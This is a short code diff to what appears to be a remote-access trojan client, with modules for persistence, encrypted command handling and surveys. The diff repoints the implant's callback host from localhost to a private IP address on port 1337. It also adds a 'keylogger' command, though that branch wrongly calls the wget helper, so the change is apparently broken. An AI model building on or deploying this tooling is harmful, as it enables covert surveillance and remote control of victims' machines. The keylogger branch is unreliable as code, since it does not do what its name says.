@@ -14,7 +14,7 @@ from core import common, crypto, persistence, scan, survey, toolkit
 
 
 # change these to suit your needs
-HOST = 'localhost'
+HOST = '192.168.152.13'
 PORT = 1337
 
 
@@ -87,6 +87,9 @@ def main():
             continue
 
         elif cmd == 'wget':
+            results = toolkit.wget(action)
+        
+        elif cmd == 'keylogger':
             results = toolkit.wget(action)
 
         client.sendGCM(results)
